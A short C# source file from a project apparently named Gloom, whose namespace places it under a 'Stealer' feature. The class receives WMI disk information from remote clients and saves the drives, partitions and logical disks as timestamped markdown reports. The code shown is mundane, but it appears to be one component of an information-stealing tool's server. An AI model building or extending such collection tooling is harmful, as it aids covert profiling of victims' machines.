using Gloom.WmiOps;
using Serilog;
using System.Text;

namespace Gloom.Server.Features.Stealer.InfoCollector.Wmi;
internal class WmiDiskInfo : WmiInfo
{
	public WmiDiskInfo() : base("dsk", WmiOpCodes.DiskInfo)
	{
	}

	public override async Task Handle(string from, byte[] data)
	{
		var rsp = StructConvert.Bytes2Struct<DiskInfoResponse>(data);
		var fileName = $"Disk information of {from.Replace(':', '#')} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.md";
		try
		{
			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);

			fw.WriteLine("# Disk drives");
			fw.WriteLine(rsp.DiskDrives.ToMarkdownTable());

			fw.WriteLine("# Disk partitions");
			fw.WriteLine(rsp.DiskPartitions.ToMarkdownTable());

			fw.WriteLine("# Logical disks");
			fw.WriteLine(rsp.LogicalDisks.ToMarkdownTable());

			Log.Information("Disk info of {client} written to {path}.", from, fileName);
		}
		catch (Exception ex)
		{
			Log.Error(ex, "Exception during handling of wmi disk info response.");
		}
	}
}
